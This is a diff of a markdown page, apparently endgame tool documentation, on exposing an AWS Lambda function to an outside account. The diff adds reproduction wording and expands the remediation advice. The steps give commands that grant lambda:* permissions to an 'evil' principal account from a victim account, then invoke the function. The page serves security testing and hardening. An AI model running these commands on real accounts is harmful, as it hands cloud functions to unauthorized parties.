@@ -8,17 +8,19 @@ Existing Exploitation tools such as [Pacu](https://github.com/RhinoSecurityLabs/
 
 ## Steps to Reproduce
 
-* **Option 1**: To expose the Lambda function using `endgame`:
+* **Option 1**: To expose the Lambda function using `endgame`, run the following from the victim account:
 
 ```bash
 export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
+
 endgame expose --service lambda --name test-resource-exposure
 ```
 
-* **Option 2**: To expose the Lambda Function using AWS CLI:
+* **Option 2**: To expose the Lambda Function using AWS CLI, run the following from the victim account:
 
 ```bash
 export EVIL_PRINCIPAL_ACCOUNT=999988887777
+
 aws lambda add-permission \
     --function-name test-resource-exposure \
     --action lambda:* \
@@ -77,11 +79,19 @@ aws lambda invoke --function-name $VICTIM_LAMBDA
 
 ## Remediation
 
-* Ensure that cross-account Lambda functions allow access only to trusted accounts to prevent unknown function invocation requests
-* Leverage AWS Access Analyzer to report on external access to Lambda Functions. See [the AWS Access Analyzer documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-lambda) for more details.
+* **Trusted Accounts Only**: Ensure that cross-account Lambda functions allow access only to trusted accounts to prevent unknown function invocation requests
+* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
+* **AWS Access Analyzer**: Leverage AWS Access Analyzer to report on external access to Lambda Functions. See [the AWS Access Analyzer documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-lambda) for more details.
+* **Restrict access to IAM permissions that could expose your Lambda Functions**: Tightly control access to the following IAM actions:
+  - [lambda:AddPermission](https://docs.aws.amazon.com/lambda/latest/dg/API_AddPermission.html): _Grants permission to give an AWS service or another account permission to use an AWS Lambda function_
+  - [lambda:GetPolicy](https://docs.aws.amazon.com/lambda/latest/dg/API_GetPolicy.html): _Grants permission to view the resource-based policy for an AWS Lambda function, version, or alias_
+  - [lambda:InvokeFunction](https://docs.aws.amazon.com/lambda/latest/dg/API_Invoke.html): _Grants permission to invoke an AWS Lambda function_
+  - [lambda:ListFunctions](https://docs.aws.amazon.com/lambda/latest/dg/API_ListFunctions.html): _Grants permission to retrieve a list of AWS Lambda functions, with the version-specific configuration of each function_
+  - [lambda:RemovePermission](https://docs.aws.amazon.com/lambda/latest/dg/API_RemovePermission.html): _Grants permission to revoke function-use permission from an AWS service or another account_
 
+Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)
 
 ## References
 
-* [add-permission](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/add-permission.html)
+* [aws lambda add-permission](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/add-permission.html)
 * [Access Analyzer support for AWS Lambda Functions](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-lambda)
